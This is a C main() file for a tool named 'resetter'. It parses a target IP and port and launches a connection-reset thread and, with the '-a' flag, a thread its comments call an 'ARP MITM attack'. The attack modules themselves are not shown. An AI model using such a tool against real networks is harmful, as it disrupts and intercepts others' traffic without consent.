#include "core.h"
#include "arp_mitm.h"
#include "listener.h"
#include "resetter.h"
#include "thread_mgr.h"

extern void testfunc();

static void on_signal_trapped(int);

void usage(char **argv) {
    printf("usage: %s [-aph] [target_ip]\n"
           "  -a         enable arp mitm\n"
           "  -p <port>  target port\n"
           "  -h         help\n",
           argv[0]);
}

int main(int argc, char **argv) {
    printf("resetter (c)2019 Chris Lyon\n\n");

    int flag;
    char *target_ip = NULL;
    uint16_t target_port = 0;
    int arp_mitm = 0;

    while ((flag = getopt(argc, argv, "ahp:")) != -1) {
        switch (flag) {
            case 'a':
                // Enable ARP MITM attack
                arp_mitm = 1;
                break;

            case 'h':
                // Help
                usage(argv);
                return EXIT_SUCCESS;

            case 'p':
                // Target port
                target_port = strtol(optarg, NULL, 10);
                break;

            default:
                // Unknown
                usage(argv);
                return EXIT_FAILURE;
        }
    }

    // Remaining positional args
    char **argv_remaining = &argv[optind];
    target_ip = argv_remaining[0];

    signal(SIGINT, on_signal_trapped); // Trap ^C

    // Start resetter thread
    thread_node resetter_thread_node;
    thmgr_append_thread(&resetter_thread_node);
    if (start_resetter_thread(&resetter_thread_node, target_ip, target_port) != 0) {
        fprintf(stderr, "failed to start resetter thread\n");
        thmgr_cleanup();
        return EXIT_FAILURE;
    }

    // Start arpmitm thread
    if (arp_mitm) {
        thread_node arp_mitm_thread_node;
        thmgr_append_thread(&arp_mitm_thread_node);
        if (start_arp_mitm_thread(&arp_mitm_thread_node) != 0) {
            fprintf(stderr, "failed to start arp mitm thread\n");
            thmgr_cleanup();
            return EXIT_FAILURE;
        }
    }

    thmgr_wait_for_threads();
    thmgr_cleanup();
    return EXIT_SUCCESS;
}

static void on_signal_trapped(int signum) {
    if (signum == SIGINT) {
        thmgr_cleanup();
    }
}
